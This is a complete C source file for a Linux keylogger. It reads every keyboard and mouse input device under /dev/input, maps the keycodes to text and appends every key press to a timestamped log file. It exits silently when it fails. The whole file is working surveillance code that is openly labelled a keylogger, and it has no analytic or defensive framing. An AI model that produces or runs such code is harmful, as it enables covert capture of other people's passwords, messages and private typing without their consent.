#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/input.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/stat.h>
#include <time.h>

#ifndef BITS_PER_LONG
#define BITS_PER_LONG (sizeof(long) * 8)
#endif

#ifndef KEY_MAX
#define KEY_MAX 0x2ff
#endif

// Helper function to test bits in ioctl results
static inline int test_bit(int bit, unsigned long *array) {
    int idx = bit / (sizeof(unsigned long) * 8);
    int offset = bit % (sizeof(unsigned long) * 8);
    return (array[idx] >> offset) & 1;
}

// Function to get the current timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t rawtime;
    struct tm *timeinfo;
    
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", timeinfo);
}

// Function to convert keycode to character representation
const char* keycode_to_char(int keycode) {
    switch(keycode) {
        case KEY_A: return "a";
        case KEY_B: return "b";
        case KEY_C: return "c";
        case KEY_D: return "d";
        case KEY_E: return "e";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_I: return "i";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_M: return "m";
        case KEY_N: return "n";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_Q: return "q";
        case KEY_R: return "r";
        case KEY_S: return "s";
        case KEY_T: return "t";
        case KEY_U: return "u";
        case KEY_V: return "v";
        case KEY_W: return "w";
        case KEY_X: return "x";
        case KEY_Y: return "y";
        case KEY_Z: return "z";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "\n";
        case KEY_BACKSPACE: return "[BACKSPACE]";
        case KEY_TAB: return "[TAB]";
        case KEY_MINUS: return "-";
        case KEY_EQUAL: return "=";
        case KEY_LEFTBRACE: return "[";
        case KEY_RIGHTBRACE: return "]";
        case KEY_BACKSLASH: return "\\";
        case KEY_SEMICOLON: return ";";
        case KEY_APOSTROPHE: return "'";
        case KEY_GRAVE: return "`";
        case KEY_COMMA: return ",";
        case KEY_DOT: return ".";
        case KEY_SLASH: return "/";
        case KEY_CAPSLOCK: return "[CAPSLOCK]";
        case KEY_F1: return "[F1]";
        case KEY_F2: return "[F2]";
        case KEY_F3: return "[F3]";
        case KEY_F4: return "[F4]";
        case KEY_F5: return "[F5]";
        case KEY_F6: return "[F6]";
        case KEY_F7: return "[F7]";
        case KEY_F8: return "[F8]";
        case KEY_F9: return "[F9]";
        case KEY_F10: return "[F10]";
        case KEY_F11: return "[F11]";
        case KEY_F12: return "[F12]";
        case KEY_ESC: return "[ESC]";
        case KEY_UP: return "[UP]";
        case KEY_DOWN: return "[DOWN]";
        case KEY_LEFT: return "[LEFT]";
        case KEY_RIGHT: return "[RIGHT]";
        case KEY_LEFTCTRL: return "[LCTRL]";
        case KEY_RIGHTCTRL: return "[RCTRL]";
        case KEY_LEFTSHIFT: return "[LSHIFT]";
        case KEY_RIGHTSHIFT: return "[RSHIFT]";
        case KEY_LEFTALT: return "[LALT]";
        case KEY_RIGHTALT: return "[RALT]";
        case KEY_SYSRQ: return "[SYSRQ]";
        case KEY_SCROLLLOCK: return "[SCROLL]";
        case KEY_PAUSE: return "[PAUSE]";
        case KEY_INSERT: return "[INSERT]";
        case KEY_HOME: return "[HOME]";
        case KEY_PAGEUP: return "[PAGEUP]";
        case KEY_PAGEDOWN: return "[PAGEDOWN]";
        case KEY_DELETE: return "[DELETE]";
        case KEY_END: return "[END]";
        case BTN_LEFT: return "\n[MOUSE LEFT]\n";
        case BTN_RIGHT: return "\n[MOUSE RIGHT]\n";
        case BTN_MIDDLE: return "\n[MOUSE MIDDLE]\n";
        case BTN_SIDE: return "\n[MOUSE SIDE]\n";
        case BTN_EXTRA: return "\n[MOUSE EXTRA]\n";
        default: return "[UNKNOWN]";
    }
}

int main() {
    // Find input devices
    int fd;
    char device_path[256];
    char log_filename[256];
    char timestamp[64];
    struct input_event ev;
    ssize_t n;
    const char* key_char;
    FILE *logfile;
    
    // Get the directory of the executable
    char exe_path[512];  // Increased size to allow for longer paths
    char timestamp_str[32];
    time_t rawtime;
    struct tm *timeinfo;
    
    // Get current time for log filename
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(timestamp_str, sizeof(timestamp_str), "%Y%m%d_%H%M%S", timeinfo);
    
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path)-1);
    if (len != -1) {
        exe_path[len] = '\0';
        // Extract directory path
        char *last_slash = strrchr(exe_path, '/');
        if (last_slash) {
            *(last_slash+1) = '\0';
            // Ensure we don't exceed buffer size
            size_t exe_len = strlen(exe_path);
            if (exe_len < sizeof(log_filename) - 32) { // 32 for "keylog_" + timestamp + ".txt" + null terminator
                snprintf(log_filename, sizeof(log_filename), "%skeylog_%s.txt", exe_path, timestamp_str);
            } else {
                snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str); // fallback to current directory
            }
        } else {
            snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
        }
    } else {
        snprintf(log_filename, sizeof(log_filename), "keylog_%s.txt", timestamp_str);
    }
    
    // Arrays to hold multiple device file descriptors
    int input_fds[20];  // Maximum 20 input devices
    int num_input_fds = 0;
    
    // Initialize all file descriptors to -1
    for (int i = 0; i < 20; i++) {
        input_fds[i] = -1;
    }
    
    // Try common input device paths
    for (int i = 0; i < 20; i++) {
        snprintf(device_path, sizeof(device_path), "/dev/input/event%d", i);
        
        fd = open(device_path, O_RDONLY);
        if (fd == -1) {
            continue;
        }
        
        // Check capabilities to determine if it has keys
        unsigned long evbit = 0;
        ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
        
        // Use a larger buffer to accommodate all possible key codes
        unsigned long keybit[KEY_MAX/BITS_PER_LONG + 1] = {0};  // Initialize to zero
        ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), &keybit);
        
        // Check if it has keys we're interested in (keyboard or mouse)
        if (test_bit(KEY_A, keybit) || test_bit(KEY_1, keybit) || 
            test_bit(BTN_LEFT, keybit) || test_bit(BTN_RIGHT, keybit) || test_bit(BTN_MIDDLE, keybit)) {
            
            if (num_input_fds < 20) {
                input_fds[num_input_fds] = fd;
                num_input_fds++;
            } else {
                close(fd); // Too many devices, close this one
            }
        } else {
            close(fd);
        }
    }
    
    if (num_input_fds == 0) {
        // Silently exit if no input devices found
        return 1;
    }
    
    // Open log file in append mode
    logfile = fopen(log_filename, "a");
    if (!logfile) {
        // Silently exit if can't open log file
        for (int i = 0; i < num_input_fds; i++) {
            if (input_fds[i] != -1) close(input_fds[i]);
        }
        return 1;
    }
    
    fprintf(logfile, "\n=== Keylogger started at %s ===\n", timestamp_str);
    fclose(logfile);
    
    // Main loop
    fd_set readfds;
    int max_fd = -1;
    
    // Determine max_fd for select()
    for (int i = 0; i < num_input_fds; i++) {
        if (input_fds[i] > max_fd) {
            max_fd = input_fds[i];
        }
    }
    
    while (1) {
        FD_ZERO(&readfds);
        for (int i = 0; i < num_input_fds; i++) {
            FD_SET(input_fds[i], &readfds);
        }
        
        if (select(max_fd + 1, &readfds, NULL, NULL, NULL) == -1) {
            // Silently break on select error
            break;
        }
        
        // Process all active file descriptors
        for (int i = 0; i < num_input_fds; i++) {
            if (FD_ISSET(input_fds[i], &readfds)) {
                n = read(input_fds[i], &ev, sizeof(ev));
                if (n == (ssize_t)-1) {
                    if (errno == EINTR)
                        continue;
                    else
                        break;
                } else if (n != sizeof(ev)) {
                    errno = EIO;
                    break;
                }
                
                if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                    key_char = keycode_to_char(ev.code);
                    
                    logfile = fopen(log_filename, "a");
                    if (logfile) {
                        if (ev.code == KEY_ENTER) {
                            fprintf(logfile, "\n");
                        } else if (ev.code == BTN_LEFT || ev.code == BTN_RIGHT || ev.code == BTN_MIDDLE ||
                                   ev.code == BTN_SIDE || ev.code == BTN_EXTRA) {
                            // Mouse button pressed - create new lines
                            fprintf(logfile, "\n%s\n", key_char);
                        } else if (strlen(key_char) == 1) {
                            fprintf(logfile, "%s", key_char);
                        } else {
                            fprintf(logfile, "%s", key_char);
                        }
                        fclose(logfile);
                    }
                }
            }
        }
    }
    
    // Close file and clean up
    logfile = fopen(log_filename, "a");
    if (logfile) {
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", timeinfo);
        fprintf(logfile, "\n=== Keylogger stopped at %s ===\n", timestamp);
        fclose(logfile);
    }
    
    // Close all input file descriptors
    for (int i = 0; i < num_input_fds; i++) {
        if (input_fds[i] != -1) close(input_fds[i]);
    }
    
    return 0;
}